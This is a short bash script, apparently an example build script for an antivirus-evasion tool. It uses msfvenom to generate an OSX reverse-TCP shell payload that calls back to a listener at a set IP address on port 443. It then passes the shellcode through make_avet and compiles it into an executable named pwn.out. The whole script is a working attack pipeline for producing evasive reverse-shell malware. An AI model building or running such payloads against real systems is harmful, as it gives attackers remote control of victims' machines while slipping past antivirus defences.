#!/bin/bash          
# simple example script for building the executable
# make reverse payload
msfvenom -p osx/x86/shell_reverse_tcp -b "\x00" EXITFUNC=process LHOST=192.168.2.111 LPORT=443 --platform OSX -f c > sc.txt
# call make_avet, the -f compiles the shellcode to the exe file
./make_avet -f sc.txt 
# compile to pwn.exe file
gcc -m32 -o pwn.out avet.c 
# cleanup
echo "" > defs.h
